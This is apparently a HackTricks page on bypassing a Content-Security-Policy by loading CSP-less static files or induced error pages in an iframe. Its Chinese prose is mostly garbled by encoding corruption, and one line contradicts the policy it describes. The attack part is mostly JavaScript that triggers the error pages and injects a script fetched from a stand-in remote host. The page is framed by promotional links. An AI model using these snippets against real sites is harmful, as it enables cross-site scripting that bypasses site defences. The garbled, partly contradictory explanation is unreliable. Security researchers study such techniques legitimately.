<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


A configuration such as:
```
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```
ç¦æ­¢ä½¿ç”¨ä»»ä½•ä»¥å­—ç¬¦ä¸²å½¢å¼ä¼ è¾“å¹¶æ‰§è¡Œä»£ç çš„å‡½æ•°ã€‚ä¾‹å¦‚ï¼š`eval, setTimeout, setInterval`éƒ½å°†è¢«é˜»æ­¢ï¼Œå› ä¸ºè®¾ç½®äº†`unsafe-eval`

ä»»ä½•æ¥è‡ªå¤–éƒ¨æ¥æºçš„å†…å®¹ä¹Ÿä¼šè¢«é˜»æ­¢ï¼ŒåŒ…æ‹¬å›¾åƒã€CSSã€WebSocketsï¼Œå°¤å…¶æ˜¯JS

### é€šè¿‡æ–‡æœ¬å’Œå›¾åƒ

è§‚å¯Ÿåˆ°ç°ä»£æµè§ˆå™¨å°†å›¾åƒå’Œæ–‡æœ¬è½¬æ¢ä¸ºHTMLä»¥å¢å¼ºå…¶æ˜¾ç¤ºæ•ˆæœï¼ˆä¾‹å¦‚ï¼Œè®¾ç½®èƒŒæ™¯ã€å±…ä¸­ç­‰ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœé€šè¿‡`iframe`æ‰“å¼€å›¾åƒæˆ–æ–‡æœ¬æ–‡ä»¶ï¼Œä¾‹å¦‚`favicon.ico`æˆ–`robots.txt`ï¼Œå®ƒå°†è¢«å‘ˆç°ä¸ºHTMLã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›é¡µé¢é€šå¸¸ç¼ºå°‘CSPæ ‡å¤´ï¼Œå¯èƒ½ä¸åŒ…æ‹¬X-Frame-Optionsï¼Œä»è€Œä½¿å¾—å¯ä»¥ä»ä¸­æ‰§è¡Œä»»æ„JavaScriptï¼š
```javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
### é€šè¿‡é”™è¯¯

åŒæ ·ï¼Œé”™è¯¯å“åº”ï¼Œå¦‚æ–‡æœ¬æ–‡ä»¶æˆ–å›¾åƒï¼Œé€šå¸¸ä¸å¸¦æœ‰CSPæ ‡å¤´ï¼Œå¯èƒ½ä¼šçœç•¥X-Frame-Optionsã€‚å¯ä»¥è¯±å‘é”™è¯¯åŠ è½½åˆ°iframeä¸­ï¼Œä»è€Œå®ç°ä»¥ä¸‹æ“ä½œï¼š
```javascript
// Inducing an nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Triggering an error with a long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Generating an error via extensive cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Removal of cookies is crucial post-execution
for(var i=0;i<5;i++){document.cookie=i+"="}
```
è§¦å‘ä»»ä½•æåˆ°çš„åœºæ™¯åï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åœ¨ iframe ä¸­å®ç° JavaScript æ‰§è¡Œï¼š
```javascript
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
## å‚è€ƒèµ„æ–™

* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
